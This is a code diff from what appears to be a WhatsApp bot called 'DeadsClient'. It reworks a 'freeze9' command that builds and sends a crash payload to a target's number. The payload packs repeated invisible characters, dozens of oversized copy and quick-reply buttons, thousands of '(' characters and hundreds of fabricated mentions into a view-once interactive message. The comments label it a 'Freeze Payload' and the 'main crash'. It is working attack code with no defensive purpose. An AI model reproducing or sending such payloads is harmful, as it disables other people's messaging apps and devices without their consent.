@@ -14767,48 +14767,74 @@ case "freeze9": {
     try {
         const buttons = [];
 
-        // Großer Single Select Button
+        // Großer Single-Select für den Haupt-Crash
         buttons.push({
             name: "single_select",
             buttonParamsJson: JSON.stringify({
-                title: "\u200E".repeat(7500),
+                title: "\u200E".repeat(7000),
                 sections: [{ title: "\u200E", rows: [] }]
             })
         });
 
-        // Viele Crash-Buttons
-        for (let i = 0; i < 35; i++) {
+        // Crash-Buttons (reduziert für Stabilität)
+        for (let i = 0; i < 30; i++) {
             buttons.push(
                 { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
                 { 
                     name: "cta_copy", 
-                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2200) }) 
+                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2000) }) 
                 },
                 { 
                     name: "quick_reply", 
-                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2200) }) 
+                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(2000) }) 
                 }
             );
         }
 
-        const messageContent = {
-            text: "☠️ DeadsClient Freeze 🔥",
-            footer: "Freeze Payload",
-            nativeFlowMessage: {
-                buttons: buttons,
-                messageParamsJson: "(".repeat(2800)
-            },
-            contextInfo: {
-                mentionedJid: [
-                    "0@s.whatsapp.net",
-                    ...Array.from({ length: 500 }, () => 
-                        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-                    )
-                ],
-                isForwarded: true,
-                forwardingScore: 999
+        const interactiveMessage = {
+            interactiveMessage: {
+                header: {
+                    title: "☠️ DeadsClient Freeze 🔥",
+                    hasMediaAttachment: false
+                },
+                body: {
+                    text: "☠️DeadsClient 🔥 Freeze Payload"
+                },
+                footer: {
+                    text: "."
+                },
+                contextInfo: {
+                    mentionedJid: [
+                        "0@s.whatsapp.net",
+                        ...Array.from({ length: 400 }, () => 
+                            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+                        )
+                    ],
+                    isForwarded: true,
+                    forwardingScore: 999
+                },
+                nativeFlowMessage: {
+                    buttons: buttons,
+                    messageParamsJson: "(".repeat(2500)
+                }
             }
         };
+
+        const messageContent = generateWAMessageFromContent(
+            target,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        ...interactiveMessage
+                    }
+                }
+            },
+            { timestamp: new Date() }
+        );
 
         await sock.sendMessage(target, messageContent);
 
